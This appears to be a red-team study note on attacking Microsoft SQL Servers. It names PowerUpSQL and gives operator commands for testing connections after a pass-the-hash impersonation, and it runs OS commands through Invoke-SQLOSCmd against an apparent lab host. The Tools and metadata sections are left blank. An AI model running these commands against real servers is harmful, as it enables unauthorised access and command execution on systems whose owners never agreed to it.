# MS SQL Servers
Microsoft SQL Server allows in addition to the obvious data theft opportunities also code execution, privilege escalation, lateral movement and persistence.

[[PowerUpSQL]] is an excellent tool for enumerating and interacting with MS SQL Servers.
-[[PowerUpSQL#Auto information gathering]]
-[[PowerUpSQL#SQL Query]]

⚠️ Use [[Pass-the-Hash]] to impersonate a user and then use [[PowerUpSQL]] to verify the connection:
>powerpick Get-SQLConnectionTest -Instance "sql.rto.local,1433" | fl

>powerpick Get-SQLQuery -Instance "sql.rto.local,1433" -Query "select @@servername"

>Invoke-SQLOSCmd -Instance "sql.rto.local,1433" -Command "whoami" -RawResults

Or use [[mssqlclient]] via [[Proxychains]] or [[HeidiSQL]] via [[Proxifier]] to query

## Tools
########
########


```meta
ttp: T1000
requirements:
results: 
description: 
```